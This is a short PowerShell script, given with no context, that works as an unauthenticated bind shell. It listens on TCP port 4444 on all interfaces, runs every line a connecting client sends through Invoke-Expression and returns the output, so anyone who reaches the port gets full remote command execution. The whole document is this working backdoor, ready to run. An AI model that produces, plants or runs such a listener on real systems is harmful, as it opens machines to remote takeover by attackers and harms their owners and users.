$port = 4444
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = [System.IO.StreamReader]::new($stream)
    $writer = [System.IO.StreamWriter]::new($stream)
    $writer.AutoFlush = $true
    while (($cmd = $reader.ReadLine()) -ne $null) {
        try { $out = Invoke-Expression $cmd | Out-String } catch { $out = $_.Exception.Message }
        $writer.WriteLine($out)
    }
    $client.Close()
}
